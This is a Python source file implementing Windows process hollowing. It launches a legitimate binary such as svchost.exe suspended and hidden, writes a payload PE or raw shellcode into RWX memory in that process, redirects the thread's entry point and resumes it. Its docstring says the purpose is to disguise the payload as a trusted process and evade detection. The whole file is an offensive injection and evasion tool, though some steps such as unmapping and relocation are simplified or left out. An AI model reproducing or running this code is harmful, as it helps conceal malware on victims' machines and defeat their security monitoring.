#!/usr/bin/env python3
"""Process hollowing — create a legitimate process, replace its image with ours.

Technique:
1. CreateProcess(CREATE_SUSPENDED) on a legitimate binary (e.g., svchost.exe)
2. Unmap the legitimate image from the target process
3. VirtualAllocEx in the target at the preferred image base
4. WriteProcessMemory: PE headers + sections
5. SetThreadContext: fix RIP/RBP/stack to entry point
6. ResumeThread — the hollowed process now runs our code

This makes the payload appear as a legitimate process in Task Manager
and Process Explorer, evading process-based detection.
"""
import ctypes
import ctypes.wintypes as wintypes
import struct
import os
import platform

def hollow(host_path, payload_path):
    """Hollow a host process with a payload PE.

    Args:
        host_path: Path to the legitimate process to hollow (e.g., C:\Windows\System32\svchost.exe)
        payload_path: Path to the payload PE to inject

    Returns:
        True if successful, False otherwise
    """
    if platform.system() != "Windows":
        return False

    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

        # Read payload PE
        with open(payload_path, "rb") as f:
            payload = f.read()

        if len(payload) < 0x40:
            return False

        # Parse PE headers
        e_lfanew = struct.unpack_from("<I", payload, 0x3C)[0]
        if payload[e_lfanew:e_lfanew+4] != b"PE\x00\x00":
            return False

        coff_offset = e_lfanew + 4
        machine = struct.unpack_from("<H", payload, coff_offset)[0]
        num_sections = struct.unpack_from("<H", payload, coff_offset + 2)[0]
        opt_header_size = struct.unpack_from("<H", payload, coff_offset + 16)[0]
        opt_offset = coff_offset + 20

        # Get image base and entry point
        if machine == 0x8664:  # x64
            image_base = struct.unpack_from("<Q", payload, opt_offset + 24)[0]
            entry_point = struct.unpack_from("<I", payload, opt_offset + 16)[0]
        else:  # x86
            image_base = struct.unpack_from("<I", payload, opt_offset + 28)[0]
            entry_point = struct.unpack_from("<I", payload, opt_offset + 16)[0]

        image_size = struct.unpack_from("<I", payload, opt_offset + 56)[0]

        # Create the host process suspended
        class STARTUPINFOW(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
                ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
            ]

        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(si)
        si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        pi = PROCESS_INFORMATION()

        host_w = ctypes.create_unicode_buffer(host_path)
        CREATE_SUSPENDED = 0x00000004

        if not k32.CreateProcessW(
            None, host_w, None, None, False,
            CREATE_SUSPENDED, None, None,
            ctypes.byref(si), ctypes.byref(pi)
        ):
            return False

        # Unmap the original image from the target
        # NtUnmapViewOfSection(hProcess, base)
        # Try to unmap at the host's image base first
        # For simplicity, we allocate at our preferred base
        target_process = pi.hProcess
        target_thread = pi.hThread

        # Allocate memory in target for the payload
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        remote_base = k32.VirtualAllocEx(
            target_process, image_base, image_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )

        if not remote_base:
            # If preferred base fails, let the system choose
            remote_base = k32.VirtualAllocEx(
                target_process, None, image_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            if not remote_base:
                k32.TerminateProcess(target_process, 1)
                k32.CloseHandle(target_thread)
                k32.CloseHandle(target_process)
                return False
            # If base differs, we'd need to relocate — for simplicity, skip
            # Real impl would apply relocations here

        # Write PE headers
        written = ctypes.c_size_t(0)
        headers_size = opt_offset + opt_header_size
        if not k32.WriteProcessMemory(target_process, remote_base,
                                      payload, headers_size,
                                      ctypes.byref(written)):
            k32.VirtualFreeEx(target_process, remote_base, 0, 0x8000)
            k32.TerminateProcess(target_process, 1)
            k32.CloseHandle(target_thread)
            k32.CloseHandle(target_process)
            return False

        # Write each section
        section_offset = coff_offset + 20 + opt_header_size
        for i in range(num_sections):
            sec_offset = section_offset + i * 40
            virtual_size = struct.unpack_from("<I", payload, sec_offset + 8)[0]
            virtual_addr = struct.unpack_from("<I", payload, sec_offset + 12)[0]
            raw_size = struct.unpack_from("<I", payload, sec_offset + 16)[0]
            raw_addr = struct.unpack_from("<I", payload, sec_offset + 20)[0]

            if raw_size == 0:
                continue

            section_data = payload[raw_addr:raw_addr + raw_size]
            write_addr = remote_base + virtual_addr

            if not k32.WriteProcessMemory(target_process, write_addr,
                                          section_data, raw_size,
                                          ctypes.byref(written)):
                pass  # Continue even if one section fails

        # Set thread context to jump to entry point
        if machine == 0x8664:  # x64
            # CONTEXT structure for x64 is large — use simplified approach
            # Set RIP to entry point
            class CONTEXT64(ctypes.Structure):
                _fields_ = [
                    ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong),
                    ("P3Home", ctypes.c_ulonglong), ("P4Home", ctypes.c_ulonglong),
                    ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                    ("ContextFlags", wintypes.DWORD), ("MxCsr", wintypes.DWORD),
                    ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
                    ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
                    ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
                    ("EFlags", wintypes.DWORD),
                    ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong),
                    ("Rax", ctypes.c_ulonglong), ("Rcx", ctypes.c_ulonglong),
                    ("Rdx", ctypes.c_ulonglong), ("Rbx", ctypes.c_ulonglong),
                    ("Rsp", ctypes.c_ulonglong), ("Rbp", ctypes.c_ulonglong),
                    ("Rsi", ctypes.c_ulonglong), ("Rdi", ctypes.c_ulonglong),
                    ("R8", ctypes.c_ulonglong), ("R9", ctypes.c_ulonglong),
                    ("R10", ctypes.c_ulonglong), ("R11", ctypes.c_ulonglong),
                    ("R12", ctypes.c_ulonglong), ("R13", ctypes.c_ulonglong),
                    ("R14", ctypes.c_ulonglong), ("R15", ctypes.c_ulonglong),
                    ("Rip", ctypes.c_ulonglong),
                    # ... more fields (truncated for brevity)
                ]

            ctx = CONTEXT64()
            ctx.ContextFlags = 0x100000  # CONTEXT_CONTROL
            k32.GetThreadContext(target_thread, ctypes.byref(ctx))
            ctx.Rcx = remote_base  # PEB pointer (simplified)
            ctx.Rip = remote_base + entry_point
            k32.SetThreadContext(target_thread, ctypes.byref(ctx))

        # Resume the thread — payload runs
        k32.ResumeThread(target_thread)

        # Cleanup handles
        k32.CloseHandle(target_thread)
        k32.CloseHandle(target_process)

        return True

    except Exception:
        return False


def hollow_with_shellcode(host_path, shellcode):
    """Hollow a host process and execute raw shellcode instead of a PE.

    Simpler than full PE hollowing — just allocates RWX memory in the
    suspended host process, writes shellcode, sets RIP, resumes.

    Args:
        host_path: Path to the host process binary
        shellcode: Raw shellcode bytes
    """
    if platform.system() != "Windows":
        return False

    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)

        class STARTUPINFOW(ctypes.Structure):
            _fields_ = [("cb", wintypes.DWORD)] + [("_pad", ctypes.c_byte * 100)]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
            ]

        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()

        host_w = ctypes.create_unicode_buffer(host_path)

        if not k32.CreateProcessW(
            None, host_w, None, None, False,
            0x00000004,  # CREATE_SUSPENDED
            None, None,
            ctypes.byref(si), ctypes.byref(pi)
        ):
            return False

        # Allocate RWX in target
        remote = k32.VirtualAllocEx(
            pi.hProcess, None, len(shellcode),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )
        if not remote:
            k32.TerminateProcess(pi.hProcess, 1)
            k32.CloseHandle(pi.hProcess)
            k32.CloseHandle(pi.hThread)
            return False

        # Write shellcode
        written = ctypes.c_size_t(0)
        if not k32.WriteProcessMemory(pi.hProcess, remote, shellcode,
                                      len(shellcode), ctypes.byref(written)):
            k32.VirtualFreeEx(pi.hProcess, remote, 0, 0x8000)
            k32.TerminateProcess(pi.hProcess, 1)
            k32.CloseHandle(pi.hProcess)
            k32.CloseHandle(pi.hThread)
            return False

        # Queue an APC to the suspended thread
        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, ctypes.c_void_p)
        apc_func = LPTHREAD_START_ROUTINE(remote)
        ntdll.NtQueueApcThread(pi.hThread, apc_func, None, None, None)

        # Resume
        k32.ResumeThread(pi.hThread)

        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return True

    except Exception:
        return False
